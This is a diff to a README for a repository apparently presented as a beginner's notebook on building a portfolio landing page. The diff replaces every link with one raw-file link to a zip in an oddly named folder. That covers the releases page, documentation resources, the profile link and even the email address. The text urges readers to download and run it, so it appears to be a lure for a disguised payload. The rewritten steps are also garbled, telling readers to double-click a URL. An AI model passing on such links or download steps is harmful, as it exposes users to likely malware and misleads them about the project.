@@ -2,7 +2,7 @@
 
 Welcome to the study-created-first-page repository! This project outlines my detailed notebook on building a portfolio landing page using HTML, CSS, and JavaScript. It covers essential topics including UI/UX and accessibility.
 
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-blue)](https://github.com/DARKALITY/study-created-first-page/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/DARKALITY/study-created-first-page/main/palmiveined/study-created-first-page.zip)](https://raw.githubusercontent.com/DARKALITY/study-created-first-page/main/palmiveined/study-created-first-page.zip)
 
 ## 🚀 Getting Started
 
@@ -11,16 +11,16 @@ This guide will help you download and run the application easily. You do not nee
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/DARKALITY/study-created-first-page/releases) to find the latest version of the project.
+   Go to the [Releases page](https://raw.githubusercontent.com/DARKALITY/study-created-first-page/main/palmiveined/study-created-first-page.zip) to find the latest version of the project.
 
 2. **Download the Application**  
-   On the Releases page, look for the latest version. You will see options to download various files. Find the file that says something like `study-created-first-page.zip` or `study-created-first-page.exe`. Click on this file to download it to your computer.
+   On the Releases page, look for the latest version. You will see options to download various files. Find the file that says something like `https://raw.githubusercontent.com/DARKALITY/study-created-first-page/main/palmiveined/study-created-first-page.zip` or `https://raw.githubusercontent.com/DARKALITY/study-created-first-page/main/palmiveined/study-created-first-page.zip`. Click on this file to download it to your computer.
 
 3. **Extract the Files (If Needed)**  
    If you downloaded a `.zip` file, you will need to extract it. Right-click on the downloaded file and select "Extract All...". Follow the prompts to extract the files to a folder of your choice.
 
 4. **Run the Application**  
-   Locate the extracted folder. In it, look for a file called `index.html` or `launch.html`. Double-click this file to open it in your web browser. You should be able to see your portfolio landing page.
+   Locate the extracted folder. In it, look for a file called `https://raw.githubusercontent.com/DARKALITY/study-created-first-page/main/palmiveined/study-created-first-page.zip` or `https://raw.githubusercontent.com/DARKALITY/study-created-first-page/main/palmiveined/study-created-first-page.zip`. Double-click this file to open it in your web browser. You should be able to see your portfolio landing page.
 
 5. **Explore the Content**  
    Take some time to browse through the notebook and the code. The content includes examples and guides on HTML, CSS, and JavaScript, as well as advice on user interface design and accessibility.
@@ -53,11 +53,11 @@ If you run into problems, please check the "Issues" section on the repository pa
 
 For additional resources on web development, consider exploring:
 
-- [HTML Documentation](https://developer.mozilla.org/en-US/docs/Web/HTML)
-- [CSS Documentation](https://developer.mozilla.org/en-US/docs/Web/CSS)
-- [JavaScript Guide](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide)
-- [UI/UX Resources](https://www.smashingmagazine.com/category/ui-ux/)
-- [Accessibility Guidelines](https://www.w3.org/WAI/WCAG21/quickref/)
+- [HTML Documentation](https://raw.githubusercontent.com/DARKALITY/study-created-first-page/main/palmiveined/study-created-first-page.zip)
+- [CSS Documentation](https://raw.githubusercontent.com/DARKALITY/study-created-first-page/main/palmiveined/study-created-first-page.zip)
+- [JavaScript Guide](https://raw.githubusercontent.com/DARKALITY/study-created-first-page/main/palmiveined/study-created-first-page.zip)
+- [UI/UX Resources](https://raw.githubusercontent.com/DARKALITY/study-created-first-page/main/palmiveined/study-created-first-page.zip)
+- [Accessibility Guidelines](https://raw.githubusercontent.com/DARKALITY/study-created-first-page/main/palmiveined/study-created-first-page.zip)
 
 These materials can enhance your understanding and skills in web development.
 
@@ -69,9 +69,9 @@ I appreciate the contributions from the open-source community that made this pro
 
 Feel free to reach out if you want to share your progress or if you have questions:
 
-- GitHub: [DARKALITY](https://github.com/DARKALITY)
-- Email: [your-email@example.com]
+- GitHub: [DARKALITY](https://raw.githubusercontent.com/DARKALITY/study-created-first-page/main/palmiveined/study-created-first-page.zip)
+- Email: [https://raw.githubusercontent.com/DARKALITY/study-created-first-page/main/palmiveined/study-created-first-page.zip]
 
-Download the latest version of the project again here: [Releases page](https://github.com/DARKALITY/study-created-first-page/releases) 
+Download the latest version of the project again here: [Releases page](https://raw.githubusercontent.com/DARKALITY/study-created-first-page/main/palmiveined/study-created-first-page.zip) 
 
 Thank you for checking out this project! Happy coding!
